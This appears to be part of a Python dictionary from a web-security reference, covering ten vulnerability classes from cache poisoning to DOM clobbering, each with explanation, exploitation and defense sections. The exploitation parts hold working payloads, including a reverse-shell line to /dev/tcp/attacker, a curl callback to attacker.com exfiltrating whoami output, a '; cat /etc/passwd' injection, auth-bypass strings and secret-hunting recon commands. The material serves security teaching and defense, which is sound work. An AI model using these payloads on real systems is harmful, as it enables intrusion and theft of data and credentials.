    "web/web-cache-poisoning": {
        "how_it_works": """Web cache poisoning stores a malicious response in a shared cache (CDN, reverse proxy) so subsequent users receive attacker-controlled content from the cache key the poisoner triggered.

Caches key responses on URL path, host, and selected headers—but often **ignore** unkeyed inputs:

- `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL`
- `Accept-Language`, `Accept-Encoding` (fat GET)
- Query parameters stripped by cache but processed by app

If the application reflects an unkeyed header in HTML (e.g., in `<link href="...">` built from `X-Forwarded-Host`), attacker poisons cache entry for a popular URL with XSS or malicious script include.

**Cache deception** (related): trick cache into storing private responses under public URLs using path confusion (`/static/app.js/..%2fprofile`).""",

        "exploitation": """**Find unkeyed inputs**

- Param Miner (Burp) identifies headers/parameters not in cache key but affecting response.
- Compare responses with varied `X-Forwarded-Host` values.

**Poisoning POC**

```http
GET /popular-page HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```

If response body includes `https://evil.com/...` and `Cache-Control` allows caching, verify with cache buster then clean request from another IP:

```http
GET /popular-page HTTP/1.1
Host: target.com
```

Victim receives poisoned body from edge cache.

**Attack flow**

```
Attacker sends crafted request → origin reflects unkeyed input → cache stores malicious response → victims load poisoned page from CDN
```

**Impact**

- Mass XSS without per-victim targeting
- Phishing content on legitimate domain
- SEO spam injection

**Tools**

- Web Cache Vulnerability Scanner, Burp Param Miner""",

        "defense": """**Cache design**

- Key on all inputs that affect response body and `Vary` headers appropriately.
- Do not reflect host/header values without validation; use configured canonical hostnames.

**Caching policy**

- `Cache-Control: private` or `no-store` on dynamic and authenticated pages.
- Separate cache partitions for authenticated vs anonymous content.

**Header hygiene**

- Strip or overwrite `X-Forwarded-*` at trusted edge only; ignore client-supplied values on origin.
- Normalize URLs at single tier.

**Testing**

- Regular cache poisoning assessments on CDN config + app behavior.
- Monitor cache HIT responses for unexpected external domains in HTML.

**WAF/CDN features**

- Some providers offer cache poisoning protection rules—enable and tune.""",
    },

    "web/business-logic": {
        "how_it_works": """Business logic flaws violate application rules and workflow assumptions rather than breaking technical controls. The code executes "correctly" from a programmer's view but allows abuse of intended process.

Examples:

- Purchasing items for negative prices or zero totals via cart manipulation
- Applying stacked discounts beyond policy
- Skipping payment step by direct URL to confirmation page
- Voting or rating more than once by parameter tampering
- Tier downgrade not enforced when subscription expires
- Referral bonuses farmed with self-referrals

These bugs arise from incomplete threat modeling of multi-step flows, trusting client-side state, race windows between microservices, and missing server-side validation of prices, quantities, and roles.

Automated scanners rarely detect logic flaws; they require understanding domain rules and adversarial creativity.""",

        "exploitation": """**Workflow mapping**

1. Document every step: browse → cart → coupon → payment → fulfillment.
2. Identify assumptions: "user already paid", "coupon applied once", "role checked on page load only".
3. Test skipping steps: jump to `/checkout/complete` without payment.

**Parameter tampering**

- Change `quantity=-1`, `price=0.01`, `currency=USD` → `currency=XXX`
- Swap `product_id` to higher-value SKU after price locked client-side
- Replay old promotional API calls after campaign ended

**Race conditions**

- Parallel coupon application (see race-condition topic)
- Simultaneous withdrawal requests exceeding balance

**Attack flow**

```
Attacker manipulates workflow state or parameters → server enforces incomplete rules → financial/governance impact without classic injection
```

**Authorization logic**

- Feature flags in JSON: `"isPremium": true` accepted from client
- Admin functions gated only by hidden URL

**Documentation for reports**

- Exact $ impact or policy violated
- Minimal reproduction with two accounts or single account steps""",

        "defense": """**Server-side authority**

- All prices, discounts, inventory, and permissions computed server-side from authoritative DB state.
- Never trust hidden fields, client JSON, or previous step cookies for security decisions.

**Workflow enforcement**

- State machine tokens: each step issues signed token required for next step.
- Idempotent payment callbacks verified against gateway records.

**Validation rules**

- Business rule engine or centralized policy layer for promotions and limits.
- Negative quantity, zero price, and cross-product constraints rejected at API layer.

**Monitoring**

- Anomaly detection: sudden spike in coupon usage, negative orders, refund patterns.
- Audit logs for manual review of high-value transactions.

**Testing**

- Threat modeling per feature (STRIDE on purchase flow).
- Pair QA testers with security reviewers for "what if I try..." scenarios.""",
    },

    "web/crlf-injection": {
        "how_it_works": """CRLF injection inserts Carriage Return (`%0d`) and Line Feed (`%0a`) characters to terminate HTTP headers or inject new ones. When applications reflect input into response headers (`Location`, `Set-Cookie`, custom headers) without stripping newline characters, attackers perform **HTTP response splitting**.

Classic scenario:

```
https://target.com/redirect?url=foo%0d%0aSet-Cookie:admin=true%0d%0a%0d%0a<script>...
```

Server emits:

```
HTTP/1.1 302 Found
Location: foo
Set-Cookie: admin=true

<script>...
```

Legacy browsers parsed the injected body as part of the response; modern mitigations reduced impact but header injection into `Set-Cookie` and cache poisoning chains remain relevant.

Log injection via CRLF in User-Agent also pollutes SIEM parsing and can forge log entries.""",

        "exploitation": """**Find injection points**

1. Parameters reflected in `Location` redirects.
2. Custom headers built from query input (`X-User-Lang: %input%`).
3. Cookie values set from URL parameters.

**Redirect header injection**

```
/page?redirect=/%0d%0aSet-Cookie:%20session=attacker%0d%0a
```

**Response splitting for XSS (historical)**

Inject `%0d%0a%0d%0a` then HTML/JS body in same parameter when proxies concatenate responses naively.

**Attack flow**

```
CRLF in parameter → reflected in response header → extra headers or premature body → session fixation / XSS / cache poison
```

**Tools**

- crlfuzz for automated scanning
- Burp Collaborator for out-of-band header reflection tests

**Chain with open redirect**

Poison `Location` to attacker URL plus injected cookies on victim domain.""",

        "defense": """**Input sanitization**

- Reject `%0d`, `%0a`, `%00` in any input used in headers.
- URL encode redirects; validate path-only targets.

**Framework defaults**

- Modern frameworks often block newline in header values—verify all custom header code paths.

**Headers**

- Use framework redirect helpers instead of manual `header()` concatenation.

**Logging**

- Sanitize log fields; structured JSON logging reduces CRLF log forging impact.

**Infrastructure**

- HTTP/2 and strict response parsing reduce response splitting; do not rely on this alone.

**Testing**

- Fuzz all redirect and cookie-setting endpoints with CRLF payloads in CI security tests.""",
    },

    "web/command-injection": {
        "how_it_works": """Command injection executes operating system shell commands when applications invoke system utilities with unsanitized user input—`os.system()`, `exec()`, `subprocess` with `shell=True`, PHP `system()`, Java `Runtime.exec()` with string concatenation.

Vulnerable features:

- Network diagnostics (ping, traceroute, nslookup)
- Image/media conversion (ImageMagick wrappers calling `convert`)
- PDF generators invoking `wkhtmltopdf`
- Git operations, backup scripts, admin "run task" panels

Shell metacharacters break out of intended argument context:

- Unix: `;`, `|`, `&&`, `` ` ``, `$()`, newline
- Windows: `&`, `|`, `^`, `%`

Blind injection uses time delays (`sleep 5`) or out-of-band callbacks (`curl attacker.com`).""",

        "exploitation": """**Detection**

```
; id
| whoami
`id`
$(curl attacker.com/$(whoami))
& ping -c 5 127.0.0.1
```

Observe response output, timing, or DNS/HTTP callbacks.

**Example vulnerable ping**

Input: `8.8.8.8; cat /etc/passwd`

Executed: `ping -c 1 8.8.8.8; cat /etc/passwd`

**Attack flow**

```
User input in shell command string → shell interprets metacharacters → arbitrary OS command → RCE on app server
```

**Tools**

```bash
commix -u "https://target.com/ping?ip=127.0.0.1" --batch
```

**Escalation**

- Reverse shell: `; bash -i >& /dev/tcp/attacker/4444 0>&1`
- Read env/secrets, cloud metadata, pivot internally
- Container breakout if excessive privileges

**Filter bypass**

- Encoding, variable expansion `$({,,)`, alternate commands `[` `]`""",

        "defense": """**Never shell out with user input**

- Use library APIs: DNS resolver libraries instead of `nslookup`, image libs instead of CLI wrappers.

**Argument arrays**

- Python: `subprocess.run(['ping', '-c', '1', ip], shell=False)` with strict IP validation.
- Java: `ProcessBuilder` with separate args, no string shell.

**Validation**

- Allow-list IPs/hostnames matching regex for intended type only.
- Reject shell metacharacters entirely.

**Privilege**

- Run app processes as non-root; containers without CAP_SYS_ADMIN.
- Seccomp/AppArmor profiles blocking `execve` of shells.

**Detection**

- Monitor child process creation from web workers (`/bin/sh`, `cmd.exe`).
- WAF signatures as secondary layer only.""",
    },

    "web/nosql-injection": {
        "how_it_works": """NoSQL injection manipulates query documents in databases like MongoDB, CouchDB, or Elasticsearch when applications pass user input directly into query operators without type-safe binding.

Classic MongoDB authentication bypass:

```json
{"username": "admin", "password": {"$ne": ""}}
```

The `$ne` (not equal) operator makes the password clause always true.

Injection also targets:

- `$gt`, `$regex` for data extraction
- `$where` JavaScript execution (deprecated but historic)
- Aggregation pipeline injection

JSON APIs and mobile backends often accept rich JSON bodies—attackers send operator objects where strings were expected because server code lacks schema validation.""",

        "exploitation": """**Authentication bypass**

POST JSON login:

```json
{
  "username": "admin",
  "password": {"$gt": ""}
}
```

**Data extraction via regex**

```json
{"email": {"$regex": "^a"}}
```

Iterate characters when response differs for matches.

**URL-encoded form (PHP apps)**

```
username=admin&password[$ne]=
```

**Attack flow**

```
JSON/query with operator objects → database interprets operators → auth bypass / data leak
```

**Tools**

```bash
nosqlmap -u "http://target.com/login" --data '{"user":"test","pass":"test"}'
```

**Blind techniques**

- Boolean: change `$regex` anchor and compare response length
- Timing: `$where` with `sleep` where JS execution enabled (rare today)""",

        "defense": """**Type-safe queries**

- MongoDB Node driver: ensure fields are strings—`if (typeof password !== 'string') reject`.
- Use explicit operator allow-lists in query builders.

**Schema validation**

- JSON Schema on API inputs rejecting objects where strings required.
- Disable `password[$ne]` style parameter pollution at framework level.

**Database config**

- Disable `$where` and server-side JS where not needed.
- Least privilege DB users without eval rights.

**Parameterized patterns**

- Use ORM/query builders that separate operators from user values structurally.

**Testing**

- Fuzz JSON fields with `{"$gt":""}` replacements in all API endpoints.""",
    },

    "web/http-parameter-pollution": {
        "how_it_works": """HTTP Parameter Pollution (HPP) sends duplicate parameters in one request (`?id=1&id=2`) knowing different components parse duplicates inconsistently.

Split behavior examples:

- **ASP.NET/IIS**: concatenates `id=1,2`
- **PHP**: often uses last value `id=2`
- **Apache**: often first value `id=1`
- **WAF vs app**: WAF inspects first; app uses second (bypass)

Impact scenarios:

- WAF/filter bypass for XSS/SQLi payloads in second parameter
- Access control: `user=attacker&user=admin`—front-end checks first, back-end authorizes second
- OAuth scope manipulation with duplicate query keys
- HPP in redirects and tracking links altering payment amounts""",

        "exploitation": """**WAF bypass**

```
/search?q=safe&q=<script>alert(1)</script>
```

If WAF scores first `q` only and PHP uses last.

**Authorization test**

```
GET /transfer?from=attacker&from=victim&amount=1000
```

Compare stack behavior with single-parameter baseline.

**Attack flow**

```
Duplicate params → parser differential between security tier and app → filter bypass / logic abuse
```

**Framework-specific research**

- Document target stack parsing rules from HackTricks/OWASP tables.
- Test GET, POST form, and JSON+query combinations.

**Tools**

- Manual Burp: duplicate rows in Params tab
- Custom scripts doubling every parameter""",

        "defense": """**Consistent parsing**

- Configure reverse proxy to normalize requests—reject duplicate parameter names or canonicalize to first/last explicitly at edge.

**Application**

- Explicitly read expected single value; reject duplicates:

```python
if len(request.GET.getlist('id')) > 1:
    abort(400)
```

**Security tier alignment**

- Ensure WAF uses same parsing as application server—or place WAF after canonicalization.

**Testing**

- Security tests include duplicate parameter cases for critical endpoints.

**Logging**

- Log full parameter lists, not only first occurrence.""",
    },

    "web/websockets": {
        "how_it_works": """WebSockets provide full-duplex channels over a long-lived connection, often after an HTTP upgrade handshake. Security issues mirror HTTP but are frequently overlooked: weak origin checks, missing auth on messages, injection into handlers, and trust in client-sent event types.

Handshake request includes `Origin` header—servers should validate it like CORS. After upgrade, many apps authenticate only at connection time or assume room membership from client-supplied `roomId` messages.

Message formats (JSON RPC, GraphQL subscriptions, STOMP) may route to SQL queries, shell commands, or broadcast to other users without per-message authorization.

Unlike REST, WebSocket traffic may bypass some WAF rules; testers must capture frames in Burp or `wscat`.""",

        "exploitation": """**Handshake tests**

1. Replay handshake with `Origin: https://evil.com`—connection accepted?
2. Connect without session cookie vs with victim cookie from another context.

**Message fuzzing**

```json
{"type": "subscribe", "channel": "admin.notifications"}
{"type": "message", "room": "private-user-123", "text": "<script>..."}
```

**Injection**

If server embeds message text into SQL or system calls without sanitization—same as HTTP injection via WS transport.

**Attack flow**

```
Malicious origin or stolen session → WS connection → unauthorized subscribe/send → data leak / XSS to other users / command execution
```

**Tools**

- Burp WebSocket history, `wscat -c wss://target.com/socket`
- Custom Python `websockets` client for parallel fuzzing

**Cross-user impact**

- Broadcast spoofing: send events appearing from other users if server trusts client `userId` field""",

        "defense": """**Handshake**

- Validate `Origin` against allow-list before `101 Switching Protocols`.
- Require auth cookie or token at upgrade; bind connection to user server-side.

**Per-message authorization**

- Re-check permissions on every subscribe/send handler.
- Never trust client `userId`; derive from authenticated session.

**Input validation**

- Schema validate message types and fields; reject unknown `type` values.
- Encode output to other clients to prevent stored WS XSS.

**Rate limiting**

- Connection and message rate limits per user/IP.
- Maximum message size limits.

**Monitoring**

- Log anomalous subscription patterns (many private channels).
- Terminate idle connections; heartbeat with timeout.""",
    },

    "web/information-disclosure": {
        "how_it_works": """Information disclosure exposes sensitive data through errors, misconfiguration, excessive API responses, and forgotten assets—not always a CVE-class bug but often high impact for attackers doing recon and chaining findings.

Common sources:

- **Verbose errors**: stack traces, SQL errors, internal paths
- **Misconfigured storage**: public S3 buckets, directory listing enabled
- **Source/repo leaks**: `.git/`, `.env`, backup files (`backup.zip`, `.sql`)
- **Metadata**: `X-Powered-By`, internal IPs in headers, comments with credentials
- **API over-fetching**: returning full user objects including PII fields
- **Client bundles**: API keys, internal URLs, feature flags in minified JS

Attackers combine small disclosures (employee names, schema hints) into larger exploits (password reset, SQLi, social engineering).""",

        "exploitation": """**Recon pipeline**

```bash
# Historical URLs and backups
gau target.com | grep -E '\\.(sql|zip|env|bak|config)$'
ffuf -u https://target.com/FUZZ -w sensitive-files.txt

# Secrets in repos and JS
trufflehog git https://github.com/org/repo
linkfinder -i bundle.js -o api-endpoints.txt
```

**Error triggering**

- Invalid IDs, type confusion (`id=abc`), missing headers—capture stack traces.
- Compare error verbosity across environments (staging more leaky).

**Attack flow**

```
Disclosure source → attacker collects credentials/schema/paths → enables targeted exploit or direct credential use
```

**Cloud checks**

- Enumerate bucket names `target-backup`, `target-dev`
- Search certificate transparency for hidden subdomains leaking internal names

**API review**

- Diff responses for `GET /users/me` vs admin; note fields like `ssn`, `internalNotes`.""",

        "defense": """**Error handling**

- Generic client messages; detailed logs server-side only.
- Disable debug mode in production (`DEBUG=False`).

**Configuration**

- Block web access to `.git`, `.env`, IDE folders at server/CDN.
- Disable directory listing; audit cloud bucket ACLs continuously.

**Data minimization**

- API field allow-lists per role; GraphQL max depth and field auth.
- Remove secrets from client bundles; use backend proxies for third-party APIs.

**Headers**

- Strip `X-Powered-By`, server version headers at proxy.

**Monitoring**

- DAST for sensitive paths; GitHub secret scanning; cloud CSPM (Prowler, ScoutSuite).

**Process**

- Rotate any credential ever committed; treat disclosure as incident.""",
    },

    "web/ldap-xpath-injection": {
        "how_it_works": """LDAP and XPath injection insert metacharacters into directory or XML queries constructed from user input—analogous to SQLi for LDAP filters and XPath expressions.

**LDAP** login filters:

```
(&(uid=USER)(password=PASS))
```

Input `*)(uid=*))(|(uid=*` can close predicates and inject OR conditions.

LDAP special characters: `*`, `(`, `)`, backslash, NUL.

**XPath** queries selecting nodes:

```xpath
//users/user[name='$name' and password='$pass']
```

Quote injection: `name' or '1'='1` bypasses authentication or extracts document content.

Blind XPath infers data by boolean queries (`substring(password,1,1)='a'`) when errors are suppressed.""",

        "exploitation": """**LDAP auth bypass**

```
username: *
password: *
# or
username: admin)(&)
password: *
```

**LDAP enumeration**

```
(&(uid=*)(userPassword=*))  via injection in search fields
```

**XPath auth bypass**

```
' or '1'='1
' or 1=1 or '
```

**Data extraction (XPath)**

```
' or substring(//user/password,1,1)='a' or '
```

Compare true/false responses across character positions.

**Attack flow**

```
Injected metacharacters in filter/expression → query logic altered → auth bypass / attribute dump
```

**Tools**

- Burp manual payloads; ldapdomaindump after creds
- XPath injection fuzz lists from PayloadsAllTheThings""",

        "defense": """**Parameterized APIs**

- LDAP: use libraries that escape filters per RFC 4515 (`ldap.filter.escape_filter_chars`).
- XPath: use parameterized XPath APIs with variable binding, not string concat.

**Input validation**

- Allow-list username charset (alphanumeric); reject `()*\\`.

**Least privilege**

- LDAP bind accounts with read-only search on required attributes only.
- XML documents queried should not contain secrets in same document as public data.

**Error handling**

- No LDAP/XPath errors to client.

**Alternative**

- Prefer modern auth protocols (OIDC) over custom LDAP filter login forms.""",
    },

    "web/dom-clobbering": {
        "how_it_works": """DOM clobbering overwrites DOM APIs or global variables using named HTML elements (`id` and `name` attributes) that browsers expose as properties on `window`, `document`, or form elements.

Example:

```html
<a id="defaultAvatar" href="https://evil.com/avatar.jpg">
```

If script uses `window.defaultAvatar` expecting a string but receives the `<a>` element, logic branches change:

```javascript
img.src = window.defaultAvatar || '/safe.png';
// becomes img.src = <a> element → may coerce to attacker URL
```

Collections form when multiple elements share names—`id=x` creates `window.x`; form fields named `x` appear as `form.x`.

Chains with scripts that use `getElementById` fallbacks incorrectly, sanitizer configuration objects, or `contentWindow` references in iframe gadgets.""",

        "exploitation": """**Find sinks**

1. Search JS for `window.*`, `document.*`, or bare global lookups used in security decisions.
2. Identify HTML injection points allowing `<form>`, `<img>`, `<a>` with attacker `id`/`name`.

**Clobber payload**

```html
<form id="config"><input name="apiUrl" value="https://evil.com"></form>
```

If code does `config.apiUrl || '/api'` and `config` is clobbered to the form, `config.apiUrl` may resolve to the input element—coerced URL in some paths.

**Attack flow**

```
HTML injection (even without script) → named elements clobber globals → existing script misreads attacker-controlled object → XSS or data exfil
```

**Combine with prototype pollution**

Pollute prototypes so clobbered nodes chain into gadget execution.

**DOMPurify bypass research**

Historical bypasses used clobbering to override sanitizer config via `id="allowedAttributes"`.""",

        "defense": """**Code hygiene**

- Use `document.getElementById` with explicit checks `typeof x === 'string'`.
- Avoid relying on `window` named element resolution in security paths.
- `const` and module scope reduce accidental global clobbering.

**HTML injection**

- Fix underlying XSS/HTML injection—clobbering requires attacker HTML in page.
- Strict CSP blocks inline script even if clobbering alters config.

**Sanitizer**

- Keep DOMPurify updated; use isolated config objects not read from DOM.

**Testing**

- Static analysis for global lookups; dynamic tests injecting clobber HTML in QA.""",
    },
}
